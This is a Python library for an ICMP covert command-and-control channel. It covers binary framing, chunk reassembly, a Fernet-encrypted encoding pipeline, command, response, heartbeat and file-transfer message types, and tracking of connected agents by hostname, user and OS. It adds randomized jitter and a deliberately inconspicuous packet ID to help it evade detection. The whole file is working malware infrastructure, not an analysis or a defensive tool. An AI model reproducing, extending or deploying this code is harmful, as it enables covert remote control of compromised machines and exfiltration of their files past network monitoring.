"""
icmp_protocol.py — Shared ICMP C2 Protocol Library

Eliminates the ~400 lines of duplicated encode/decode/encrypt code spread
across 7 files. Single source for:

    - Framing: chunk/split/join large payloads across ICMP packets
    - Encoding: plain | base64 | hex with proper layering (encode → compress)
    - Encryption: Fernet (AES-128-CBC + HMAC) with base64-safe transport
    - Message types: CMD, RSP, HB (heartbeat), FILE, ACK, ERR
    - Jitter: randomized timing between packets and heartbeats

Key fix: Fernet output is raw bytes. The original code used .decode('latin-1')
which silently corrupts data. We use base64 to safely transport binary over
the ICMP payload (UTF-8 text channel).
"""

from __future__ import annotations

import base64
import hashlib
import json
import random
import struct
import threading
import time
import zlib
from collections import defaultdict
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Any, Callable, Dict, List, Optional, Tuple


try:
    from cryptography.fernet import Fernet, InvalidToken

    HAS_FERNET = True
except ImportError:
    HAS_FERNET = False
    Fernet = None  # type: ignore
    InvalidToken = Exception  # type: ignore



# Constants

DEFAULT_ICMP_ID: int = 0x3372  # 13170 — distinctive but not obvious
DEFAULT_TTL: int = 64
DEFAULT_CHUNK_SIZE: int = 1400  # bytes — fits inside standard MTU comfortably
MAX_CHUNK_SIZE: int = 1400
HEARTBEAT_INTERVAL: float = 60.0
HEARTBEAT_JITTER: float = 15.0  # ± seconds of random jitter
SESSION_TIMEOUT: float = 90.0  # seconds without heartbeat before session expires
CHUNK_TIMEOUT: float = 30.0  # seconds before partial chunk buffer expires
MAX_FILE_SIZE: int = 100 * 1024 * 1024  # 100 MB max file transfer



# Message framing

class MsgType(IntEnum):
    """Message type identifiers encoded in the packet prefix."""
    HEARTBEAT = 0x01
    COMMAND = 0x02
    RESPONSE = 0x03
    FILE_START = 0x04
    FILE_CHUNK = 0x05
    FILE_END = 0x06
    ACK = 0x07
    ERROR = 0x08


FRAME_MAGIC: bytes = b"\xCC\x33"  # CC = same as killswitch fill byte, 33 = 0x33


def pack_frame(msg_type: MsgType, chunk_index: int, total_chunks: int,
               payload: bytes) -> bytes:
    """
    Binary framing protocol — no more colon-delimited text parsing.

    Layout (all fields big-endian):
        [2] Magic    0xCC33
        [1] Type     MsgType enum
        [2] Index    chunk index (0-based)
        [2] Total    total chunks
        [2] Length   payload length
        [N] Payload  raw bytes

    Total header: 9 bytes. Much denser than the old "0:5:base64data" format.
    """
    header = struct.pack(">2sBHHH", FRAME_MAGIC, int(msg_type),
                         chunk_index, total_chunks, len(payload))
    return header + payload


def unpack_frame(data: bytes) -> Tuple[MsgType, int, int, bytes]:
    """
    Unpack a framed message. Returns (msg_type, chunk_index, total_chunks, payload).
    """
    if len(data) < 9:
        raise ValueError(f"Frame too short: {len(data)} bytes (need >= 9)")

    magic, msg_type, chunk_index, total_chunks, payload_len = \
        struct.unpack(">2sBHHH", data[:9])

    if magic != FRAME_MAGIC:
        raise ValueError(f"Bad magic: {magic.hex()} (expected {FRAME_MAGIC.hex()})")

    payload = data[9:9 + payload_len]
    return MsgType(msg_type), chunk_index, total_chunks, payload



# Chunk assembler — fixes the broken reassembly in original code

@dataclass
class ChunkBuffer:
    """Reassembles multi-chunk messages. Thread-safe."""
    total_chunks: int = 0
    received: Dict[int, bytes] = field(default_factory=dict)
    created_at: float = field(default_factory=time.time)
    lock: threading.Lock = field(default_factory=threading.Lock)

    def add(self, index: int, total: int, data: bytes) -> Optional[bytes]:
        """Add a chunk. Returns full payload when complete, None otherwise."""
        with self.lock:
            self.total_chunks = total
            self.received[index] = data
            if len(self.received) == total:
                return b"".join(
                    self.received[i] for i in range(total)
                )
            return None

    @property
    def expired(self) -> bool:
        return time.time() - self.created_at > CHUNK_TIMEOUT


class ChunkAssembler:
    """Manages multiple concurrent chunk streams identified by key."""

    def __init__(self):
        self._buffers: Dict[str, ChunkBuffer] = {}
        self._lock = threading.Lock()

    def feed(self, key: str, index: int, total: int,
             data: bytes) -> Optional[bytes]:
        """Feed a chunk. Returns full message when complete."""
        with self._lock:
            # Cleanup expired buffers
            expired = [k for k, v in self._buffers.items() if v.expired]
            for k in expired:
                del self._buffers[k]

            if key not in self._buffers:
                self._buffers[key] = ChunkBuffer()

            return self._buffers[key].add(index, total, data)

    def clear(self, key: str):
        with self._lock:
            self._buffers.pop(key, None)



# Encoding pipeline — encode → compress → encrypt (correct layering)

class Codec:
    """
    Encoding pipeline with correct layering.

    Encode:    raw_bytes → compress? → encode? → encrypt? → b64 → framed bytes
    Decode:    framed bytes → b64 → decrypt? → decode? → decompress? → raw_bytes

    The original code had a bug: compression would OVERWRITE the encoding
    result instead of layering. This fixes it.
    """

    def __init__(self, encoding: str = "plain", compress: bool = False,
                 encrypt: bool = False, key: Optional[str] = None):
        self.encoding = encoding
        self.compress = compress
        self.encrypt = encrypt
        self._cipher: Optional[Any] = None

        if encrypt and key and HAS_FERNET:
            try:
                self._cipher = Fernet(key.encode())
            except Exception:
                raise ValueError("Invalid Fernet key — generate with: "
                                 "python -c \"from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())\"")

    def encode_payload(self, data: bytes) -> bytes:
        """
        Full encode pipeline: bytes → compress? → encode? → encrypt? → base64.

        Uses base64 (not latin-1!) for transport — Fernet output is binary
        and latin-1 silently corrupts non-decodable bytes.
        """
        result = data

        # Step 1: Compress (optional)
        if self.compress:
            result = zlib.compress(result, level=6)

        # Step 2: Encode (optional, applied AFTER compression)
        if self.encoding == "base64":
            result = base64.b64encode(result)
        elif self.encoding == "hex":
            result = result.hex().encode()

        # Step 3: Encrypt (optional)
        if self.encrypt and self._cipher:
            result = self._cipher.encrypt(result)

        # Step 4: Always b64 for safe transport
        result = base64.b64encode(result)

        return result

    def decode_payload(self, data: bytes) -> bytes:
        """
        Full decode pipeline: base64 → decrypt? → decode? → decompress? → bytes.
        """
        # Step 1: Base64 decode
        try:
            result = base64.b64decode(data)
        except Exception:
            raise ValueError("Invalid base64 payload")

        # Step 2: Decrypt (optional)
        if self.encrypt and self._cipher:
            try:
                result = self._cipher.decrypt(result)
            except InvalidToken:
                raise ValueError("Decryption failed — wrong key or tampered data")
            except Exception as e:
                raise ValueError(f"Decryption error: {e}")

        # Step 3: Decode (optional, applied BEFORE decompression)
        if self.encoding == "base64":
            result = base64.b64decode(result)
        elif self.encoding == "hex":
            result = bytes.fromhex(result.decode())

        # Step 4: Decompress (optional)
        if self.compress:
            try:
                result = zlib.decompress(result)
            except zlib.error:
                # Data might not have been compressed — return as-is
                pass

        return result

    def encode_text(self, text: str) -> bytes:
        """Encode a text string through the pipeline."""
        return self.encode_payload(text.encode("utf-8"))

    def decode_text(self, data: bytes) -> str:
        """Decode back to text string."""
        return self.decode_payload(data).decode("utf-8", errors="replace")

    @staticmethod
    def generate_key() -> str:
        """Generate a new Fernet key."""
        if not HAS_FERNET:
            raise RuntimeError("cryptography package not installed")
        return Fernet.generate_key().decode()



# Session tracking

@dataclass
class Session:
    """Tracks a connected agent."""
    ip: str
    hostname: str = "unknown"
    user: str = "unknown"
    os: str = "unknown"
    first_seen: float = field(default_factory=time.time)
    last_heartbeat: float = field(default_factory=time.time)
    heartbeat_count: int = 0
    session_id: str = ""

    def __post_init__(self):
        if not self.session_id:
            self.session_id = hashlib.sha256(
                f"{self.ip}:{self.first_seen}".encode()
            ).hexdigest()[:12]

    @property
    def alive(self) -> bool:
        return (time.time() - self.last_heartbeat) < SESSION_TIMEOUT

    @property
    def uptime(self) -> float:
        return time.time() - self.first_seen


class SessionManager:
    """Thread-safe session registry."""

    def __init__(self):
        self._sessions: Dict[str, Session] = {}
        self._lock = threading.Lock()

    def heartbeat(self, ip: str, **info) -> Session:
        """Register or update a session on heartbeat."""
        with self._lock:
            if ip not in self._sessions:
                self._sessions[ip] = Session(ip=ip, **info)
            sess = self._sessions[ip]
            sess.last_heartbeat = time.time()
            sess.heartbeat_count += 1
            for k, v in info.items():
                if hasattr(sess, k):
                    setattr(sess, k, v)
            return sess

    def get(self, ip: str) -> Optional[Session]:
        with self._lock:
            return self._sessions.get(ip)

    def list_alive(self) -> List[Session]:
        """Return alive sessions, prune dead ones."""
        with self._lock:
            dead = [ip for ip, s in self._sessions.items() if not s.alive]
            for ip in dead:
                del self._sessions[ip]
            return list(self._sessions.values())

    def remove(self, ip: str):
        with self._lock:
            self._sessions.pop(ip, None)



# Jitter helper

def jittered_interval(base: float, jitter: float) -> float:
    """Return base ± jitter seconds, clamped >= 1.0."""
    return max(1.0, base + random.uniform(-jitter, jitter))


def jittered_sleep(base: float, jitter: float):
    """Sleep for a jittered duration."""
    time.sleep(jittered_interval(base, jitter))



# File transfer helpers

@dataclass
class FileTransfer:
    """Tracks an in-progress file transfer."""
    transfer_id: str
    filename: str
    total_size: int
    chunk_size: int = 8192
    received: int = 0
    chunks: Dict[int, bytes] = field(default_factory=dict)
    created_at: float = field(default_factory=time.time)
    lock: threading.Lock = field(default_factory=threading.Lock)

    @property
    def complete(self) -> bool:
        return self.received >= self.total_size

    @property
    def progress_pct(self) -> float:
        if self.total_size == 0:
            return 100.0
        return (self.received / self.total_size) * 100.0

    @property
    def expired(self) -> bool:
        return time.time() - self.created_at > 300  # 5 min timeout


def chunk_file(filepath: str, chunk_size: int = 8192) -> List[bytes]:
    """Read a file and split into chunks."""
    with open(filepath, "rb") as f:
        chunks = []
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            chunks.append(chunk)
        return chunks



# Status codes for structured responses

def status_ok(data: Any = None) -> bytes:
    """Create a JSON status response."""
    return json.dumps({"status": "ok", "data": data}).encode()


def status_err(message: str) -> bytes:
    """Create a JSON error response."""
    return json.dumps({"status": "error", "message": message}).encode()
